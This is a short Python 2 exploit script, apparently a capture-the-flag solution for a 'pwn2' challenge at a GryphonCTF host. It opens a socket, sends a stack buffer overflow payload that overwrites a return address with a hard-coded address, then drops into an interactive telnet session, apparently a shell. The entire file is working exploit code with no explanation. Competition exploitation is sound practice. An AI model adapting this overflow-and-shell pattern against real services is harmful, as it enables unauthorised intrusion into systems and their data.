#!/usr/bin/python
import socket
import telnetlib
# nc pwn2.chal.gryphonctf.com 17343
host = "pwn2.chal.gryphonctf.com"
port = 17343
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
print s.recv(1024)

payload = "a" * 20 +"\x00"+"AAAABBBBCCCCDDD" + "\x7b\x85\x04\x08"
s.send(payload+"\n")
print s.recv(1024)

t = telnetlib.Telnet()
t.sock = s
t.interact()